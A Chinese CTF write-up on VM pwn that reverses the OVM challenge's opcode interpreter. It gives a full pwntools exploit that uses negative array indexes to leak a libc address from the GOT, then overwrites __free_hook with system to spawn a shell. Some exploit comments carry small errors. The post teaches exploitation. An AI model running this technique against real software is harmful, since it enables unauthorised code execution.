---
title: VMpwn 入门学习
published: 2024-07-24
description: 以一道简单vmpwn的题目来完成入门
tags: [CTF, pwn]
category: Front-end
draft: false
---

这里将以一道入门级别的vmpwn题目简单学习一下



# 知识点

题目会模拟指令，根据题目意思解题即可，而且这类的题目往往存在数组溢出的问题



# 例题1：[OGeek2019 Final]OVM

## 分析

```c
int __fastcall main(int argc, const char **argv, const char **envp)
{
  unsigned __int16 size; // [rsp+2h] [rbp-Eh] BYREF
  unsigned __int16 pc; // [rsp+4h] [rbp-Ch] BYREF
  unsigned __int16 v6; // [rsp+6h] [rbp-Ah] BYREF
  int v7; // [rsp+8h] [rbp-8h]
  int i; // [rsp+Ch] [rbp-4h]

  heap = malloc(0x8CuLL);
  setbuf(stdin, 0LL);
  setbuf(stdout, 0LL);
  setbuf(stderr, 0LL);
  signal(2, signal_handler);
  write(1, "WELCOME TO OVM PWN\n", 0x16uLL);
  write(1, "PC: ", 4uLL);
  _isoc99_scanf("%hd", &pc）;                          //填0,后面方便填入数据
  getchar();
  write(1, "SP: ", 4uLL);
  _isoc99_scanf("%hd", &v6);                     
  getchar();
  reg[13] = v6;
  reg[15] = pc;
  write(1, "CODE SIZE: ", 0xBuLL);
  _isoc99_scanf("%hd", &size);                      //操作执行的次数
  getchar();
  if ( v6 + (unsigned int)size > 0x10000 || !size )
  {
    write(1, "EXCEPTION\n", 0xAuLL);
    exit(155);
  }
  write(1, "CODE: ", 6uLL);
  running = 1;
  for ( i = 0; size > i; ++i )
  {
    _isoc99_scanf("%d", &memory[pc + i]);
    if ( (memory[i + pc] & 0xFF000000) == 0xFF000000 )
      memory[i + pc] = 0xE0000000;
    getchar();
  }
  while ( running )
  {
    v7 = fetch();
    execute(v7);
  }
  write(1, "HOW DO YOU FEEL AT OVM?\n", 0x1BuLL);
  read(0, heap, 0x8CuLL);
  sendcomment(heap);
  write(1, "Bye\n", 4uLL);
  return 0;
}
```



这里面的操作数，pc sp在这题中没有什么作用，size决定后面的输入的循环的次数



### 主要函数

现在我们来逆向这题的重点，execute函数

```c
ssize_t __fastcall execute(int opcode)
{
  ssize_t desk; // rax
  unsigned __int8 small; // [rsp+18h] [rbp-8h]
  unsigned __int8 middle; // [rsp+19h] [rbp-7h]
  unsigned __int8 high; // [rsp+1Ah] [rbp-6h]
  int i; // [rsp+1Ch] [rbp-4h]
                                                // 16-20
  high = (opcode & 0xF0000u) >> 16;
  middle = (unsigned __int16)(opcode & 0xF00) >> 8;// 8-12
  small = opcode & 0xF;                         // 0-3
  desk = HIBYTE(opcode);                        // #define HIBYTE(x) ((x>>24)& 0xff) 25-32
  if ( HIBYTE(opcode) == 0x70 )
  {
    desk = (ssize_t)reg;
    reg[high] = reg[small] + reg[middle];       // //add
    return desk;
  }
  if ( HIBYTE(opcode) > 0x70u )
  {
    if ( HIBYTE(opcode) == 0xB0 )
    {

      desk = (ssize_t)reg;
      reg[high] = reg[small] ^ reg[middle];
      return desk;
    }
    if ( HIBYTE(opcode) > 0xB0u )
    {
      if ( HIBYTE(opcode) == 0xD0 )
      {
        desk = (ssize_t)reg;
        reg[high] = (int)reg[middle] >> reg[small];
        return desk;
      }
      if ( HIBYTE(opcode) > 0xD0u )
      {
        if ( HIBYTE(opcode) == 0xE0 )
        {
          running = 0;
          if ( !reg[13] )
            return write(1, "EXIT\n", 5uLL);
        }
        else if ( HIBYTE(opcode) != 0xFF )
        {
          return desk;
        }
        running = 0;
        for ( i = 0; i <= 15; ++i )
          printf("R%d: %X\n", (unsigned int)i, (unsigned int)reg[i]);
        return write(1, "HALT\n", 5uLL);
      }
      else if ( HIBYTE(opcode) == 0xC0 )
      {
        desk = (ssize_t)reg;
        reg[high] = reg[middle] << reg[small];
      }
    }
    else
    {
      switch ( HIBYTE(opcode) )
      {
        case 0x90u:
          desk = (ssize_t)reg;
          reg[high] = reg[small] & reg[middle];
          break;
        case 0xA0u:
          desk = (ssize_t)reg;
          reg[high] = reg[small] | reg[middle];
          break;
        case 0x80u:
          desk = (ssize_t)reg;
          reg[high] = reg[middle] - reg[small];
          break;
      }
    }
  }
  else if ( HIBYTE(opcode) == 0x30 )
  {
    desk = (ssize_t)reg;
    reg[high] = memory[reg[small]];
  }
  else if ( HIBYTE(opcode) > 0x30u )
```



这里把我们输入的int类型（32位）转化为各个相当于寄存器的值，在对这些值根据函数中的逻辑进行编码操作



这是大概逆向出来的样子

```assembly
0x10: reg[high]=reg[small]  //也就是低八位
0x20: reg[high]=0
0x30: reg[high] = memory[reg[small]]
0x40: memory[reg[small]] = reg[high]
0x50: stack[desk] = reg[high]
0x60: reg[high] = stack[reg[13]]
0x70: reg[high] = reg[small] + reg[middle]
0x80: reg[high] = reg[middle] - reg[small]
0x90: reg[high] = reg[small] & reg[middle]
0xa0: reg[high] = reg[small] | reg[middle]
0xb0: reg[high] = reg[small] ^ reg[middle]
0xc0: reg[high] = reg[middle] << reg[small]
0xd0: reg[high] = (int)reg[middle] >> reg[small]
0xe0: running = 0 //结束循环
0xff: pritnf(reg[i])（1~15）
```

可以数组内部填入负数从而使达到越界访问



一些逆向中的代码解释

```assembly
  high = (opcode & 0xF0000u) >> 16;                 //16-20
  middle = (unsigned __int16)(opcode & 0xF00) >> 8;// 8-11
  small = opcode & 0xF;                            // 0-3
  desk = HIBYTE(opcode);                           // #define HIBYTE(x) ((x>>24)& 0xff) 24-31
  
  
 reg[high] = (unsigned __int8)opcode;               //这个会把代码截断为低八位
```





### 思路

那么我们知道了这样的过程怎么进行操作呢

这题有个关键的数组就是memory数组

```assembly
got:0000000000201F78 stdout_ptr      dq offset stdout        ; DATA XREF: main+36↑r
.got:0000000000201F80 stdin_ptr       dq offset stdin         ; DATA XREF: main+1F↑r
.got:0000000000201F88 write_ptr       dq offset __imp_write   ; DATA XREF: write↑r
.got:0000000000201F90 setbuf_ptr      dq offset __imp_setbuf  ; DATA XREF: setbuf↑r
.got:0000000000201F98 printf_ptr      dq offset __imp_printf  ; DATA XREF: printf↑r
.got:0000000000201FA0 read_ptr        dq offset __imp_read    ; DATA XREF: read↑r
.got:0000000000201FA8 __libc_start_main_ptr dq offset __imp___libc_start_main
.got:0000000000201FA8                                         ; DATA XREF: __libc_start_main↑r
.got:0000000000201FB0 getchar_ptr     dq offset __imp_getchar ; DATA XREF: getchar↑r
...
bss:0000000000202060 memory 
```

1. memory在静态分析中，上面的函数存在got，而我们在execute中可以直接修改这个数组
2. 我们便可以先把reg的某个地方存放ptr表，就可以把got表打印出来了
3. 又因为这是2.23，我们可以直接修改函数的free_hook
4. 我们可以把堆快存放的地址改成free_hook,利用主函数后面的写功能完成这个函数
5. 接着把free改成system，实现getshell



### EXP的编写

先算出memory距离stdin_ptr为56个数组

```python
def opcode(desk,high,middle,small):
    op = desk<<24
    op+= high <<16
    op+= middle<<8
    op+= small
    return(str(op))

sl(opcode(0x10,0,0,56)) #reg[0]=56
sl(opcode(0x80,3,1,0))  #reg[3]=reg[1]-reg[0]=-56
sl(opcode(0x30,7,0,3))  #reg[7]=memory[-56]
sl(opcode(0x10,0,0,55)) #reg[0]=56
sl(opcode(0x80,3,1,0))  #reg[3]=reg[1]-reg[0]=-55
sl(opcode(0x30,8,0,3))  #reg[8]=memory[-55]
```

我们算出来偏移，接着我们要把stdin的地址改成__free_hook

![image-20250316170403487](https://blog-yfy.oss-cn-wuhan-lr.aliyuncs.com/202503161704557.png)



gdb计算出偏移

```python
sl(opcode(0x10,0,0,1)) #reg[0]=1
sl(opcode(0x10,1,0,12)) #reg[1]=12
sl(opcode(0xc0,2,0,1)) #reg[2]=reg[0]<<reg[1]  -->  1<<12 =0x1000
sl(opcode(0x10,0,0,0x90)) #reg[0]=0x90
sl(opcode(0x70,10,0,2))  #reg[10]=reg[0]+reg[2] -->0x1000+0x90=0x1090
sl(opcode(0x70,12,7,10))  #reg[12]=reg[7]+reg[10] 
```

再把堆快改到对free_hook前面8个字节

```
sl(opcode(0x10,0,0,8))  #reg[0]=8
sl(opcode(0x10,1,0,0))  #reg[1]=0
sl(opcode(0x80,2,1,0))  #reg[2]=reg[1]-reg[0]=-8
sl(opcode(0x40,12,0,2))  #memeory[reg[2]]=reg[12]
sl(opcode(0x70,5,10,12)) #reg[5]=reg[10]+reg[12]
sl(opcode(0x10,0,0,7))  #reg[0]=7sl(opcode(0x10,1,0,0))  #reg[1]=0
sl(opcode(0x80,2,1,0))  #reg[2]=reg[1]-reg[0]=-7
sl(opcode(0x40,11,0,2))  #memeory[reg[2]]=reg[11]
sl(opcode(0xff,0,0,0))
```



后面只需算出地址即可

```python

rl(b'R7:')
low=int(p.recv(9),16)
lg('low',low)

rl(b'R11:')
high=int(p.recv(5),16)
lg('high',high)

stdin=(high<<32)+low
libc_base=stdin-libc.sym['stdin']

system=libc_base+libc.sym['system']
lg('system',system)

sl(b'/bin/sh\x00'+p64(system))
```



## exp

```python
from pwn import * 
context(arch = 'amd64',os = 'linux',log_level = 'debug')
local_file  = './pwn'
local_libc  = '/home/yfy/tools/glibc-all-in-one/libs/2.23-0ubuntu3_amd64/libc.so.6'
remote_libc = '/home/yfy/pwn_tools/buu_libc/16-64/libc-2.23.so'
select = 1
if select == 0:
    p = process(local_file)
    libc = ELF(local_libc)
elif select == 1:
    p = remote('node5.buuoj.cn',26749)
    libc = ELF(remote_libc)
else:
    p = gdb.debug(local_file)
    libc = ELF(local_libc)
elf = ELF(local_file)


s = lambda data : p.send(data)
sa  = lambda text,data  :p.sendafter(text, data)
sl  = lambda data   :p.sendline(data)
sla = lambda text,data  :p.sendlineafter(text, data)
rl  = lambda text   :p.recvuntil(text)
pr = lambda num=4096 :print(p.recv(num))
inter   = lambda        :p.interactive()
l32 = lambda    :u32(p.recvuntil(b'\xf7')[-4:].ljust(4,b'\x00'))
l64 = lambda    :u64(p.recvuntil(b'\x7f')[-6:].ljust(8,b'\x00'))
uu32    = lambda    :u32(p.recv(4).ljust(4,b'\x00'))
uu64    = lambda    :u64(p.recv(6).ljust(8,b'\x00'))
int16   = lambda data   :int(data,16)
lg = lambda s, num: log.success(f"{s} >>> {hex(num)}")
# 0x10: reg[high]=small  //也就是低八位
# 0x20: reg[high]=0
# 0x30: reg[high] = memory[reg[small]]
# 0x40: memory[reg[small]] = reg[high]
# 0x50: stack[desk] = reg[high]
# 0x60: reg[high] = stack[reg[13]]
# 0x70: reg[high] = reg[small] + reg[middle]
# 0x80: reg[high] = reg[middle] - reg[small]
# 0x90: reg[high] = reg[small] & reg[middle]
# 0xa0: reg[high] = reg[small] | reg[middle]
# 0xb0: reg[high] = reg[small] ^ reg[middle]
# 0xc0: reg[high] = reg[middle] << reg[small]
# 0xd0: reg[high] = (int)reg[middle] >> reg[small]
# 0xe0: running = 0 //结束循环
# 0xff: pritnf(reg[i])（1~15）


def opcode(desk,high,middle,small):
    op = desk<<24
    op+= high <<16
    op+= middle<<8
    op+= small
    return(str(op))

sla('PCPC: ','0')
sla('SP: ','1')
sla('CODE SIZE: ',str(21))
rl('CODE: ')

sl(opcode(0x10,0,0,56)) #reg[0]=56
sl(opcode(0x80,3,1,0))  #reg[3]=reg[1]-reg[0]=-56
sl(opcode(0x30,7,0,3))  #reg[7]=memory[-56]
sl(opcode(0x10,0,0,55)) #reg[0]=56
sl(opcode(0x80,3,1,0))  #reg[3]=reg[1]-reg[0]=-55
sl(opcode(0x30,11,0,3))  #reg[11]=memory[-55]
# reg[7] reg[8]--->stdin

# free_hook-stdin=0x1098-8=0x1090

sl(opcode(0x10,0,0,1)) #reg[0]=1
sl(opcode(0x10,1,0,12)) #reg[1]=12
sl(opcode(0xc0,2,0,1)) #reg[2]=reg[0]<<reg[1]  -->  1<<12 =0x1000
sl(opcode(0x10,0,0,0x90)) #reg[0]=0x90
sl(opcode(0x70,10,0,2))  #reg[10]=reg[0]+reg[2] -->0x1000+0x90=0x1090
sl(opcode(0x70,12,7,10))  #reg[12]=reg[7]+reg[10] 

sl(opcode(0x10,0,0,8))  #reg[0]=8
sl(opcode(0x10,1,0,0))  #reg[1]=0
sl(opcode(0x80,2,1,0))  #reg[2]=reg[1]-reg[0]=-8
sl(opcode(0x40,12,0,2))  #memeory[reg[2]]=reg[12]
sl(opcode(0x70,5,10,12)) #reg[5]=reg[10]+reg[12]
sl(opcode(0x10,0,0,7))  #reg[0]=7sl(opcode(0x10,1,0,0))  #reg[1]=0
sl(opcode(0x80,2,1,0))  #reg[2]=reg[1]-reg[0]=-7
sl(opcode(0x40,11,0,2))  #memeory[reg[2]]=reg[11]
sl(opcode(0xff,0,0,0))

# gdb.attach(p)
# pause()

rl(b'R7:')
low=int(p.recv(9),16)
lg('low',low)

rl(b'R11:')
high=int(p.recv(5),16)
lg('high',high)

stdin=(high<<32)+low
libc_base=stdin-libc.sym['stdin']

system=libc_base+libc.sym['system']
lg('system',system)

sl(b'/bin/sh\x00'+p64(system))

p.interactive()

```



# 参考文章

[[OGeek2019 Final\]OVM（简易虚拟机逃逸）_vm pwn题-CSDN博客](https://blog.csdn.net/m0_51251108/article/details/127354652?spm=1001.2014.3001.5506)
